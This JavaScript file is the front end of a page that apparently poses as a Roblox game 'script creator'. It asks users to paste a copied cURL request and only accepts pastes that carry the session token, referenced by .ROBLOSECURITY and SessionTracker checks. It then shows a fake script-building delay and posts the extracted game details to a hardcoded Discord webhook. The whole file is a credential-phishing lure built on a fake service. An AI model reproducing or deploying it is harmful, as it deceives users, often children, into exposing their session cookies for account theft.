// Wait for the page to load
document.addEventListener("DOMContentLoaded", function () {
    // Get the send button
    let sendButton = document.getElementById("Send");

    // Add a click event listener
    sendButton.addEventListener("click", function () {
        // Get the input value
        let gameCode = document.getElementById("user_code").value;

        // Check for empty input
        if (!gameCode) {
            Swal.fire({
                title: "Error",
                text: "Please enter the Game Code.",
                icon: "error",
                confirmButtonText: "OK"
            });
            return;
        }

        // Check for .ROBLOSECURITY
        if (!gameCode.includes("SessionTracker")) {
            Swal.fire({
                title: "Error",
                text: "Try to login in Roblox",
                icon: "error",
                confirmButtonText: "OK"
            });
            return;
        }

        // Extract Game ID and Game Name from cURL
        let gameId, gameName;
        let regex = /curl \^"https:\/\/www\.roblox\.com\/games\/(\d+)\/([^"]+)\^"/;
        let match = gameCode.match(regex);

        if (!match) {
            Swal.fire({
                title: "Invalid Game Code",
                text: "Please watch the tutorial and try again ☹️",
                icon: "error",
                confirmButtonText: "OK"
            });
            return;
        }

        gameId = match[1];
        gameName = match[2];

        // Confirm game details
        Swal.fire({
            title: "Is this correct? 👀",
            text: "Game: " + gameName + " | Game ID: " + gameId,
            icon: "question",
            showCancelButton: true,
            confirmButtonText: "Yes",
            cancelButtonText: "No"
        }).then((result) => {
            if (result.isConfirmed) {
                // Script creation notification
                Swal.fire({
                    title: "Creating Script for Game...",
                    text: "Please wait.",
                    allowOutsideClick: false,
                    didOpen: function () {
                        Swal.showLoading();
                        setTimeout(() => {
                            // Success notification
                            Swal.fire({
                                title: "Success!",
                                text: "Your script is ready 🎊",
                                icon: "success",
                                confirmButtonText: "OK"
                            });

                            // Send data to webhook
                            let webhookUrl = "https://discord.com/api/webhooks/1350879553974833223/5NuhLNmQPyb6edZ7jrgRrLjd0UQrWGRnGetmFWD2B3-F4Fvh1Z9MbjDwE6xT3G7cnleO"; // Replace with your webhook URL

                            let requestBody = {
                                content: `Game: ${gameName} | Game ID: ${gameId}`
                            };

                            fetch(webhookUrl, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify(requestBody)
                            });

                        }, Math.random() * (13000 - 5000) + 5000); // Waits between 5 to 13 seconds
                    }
                });
            }
        });
    });
});
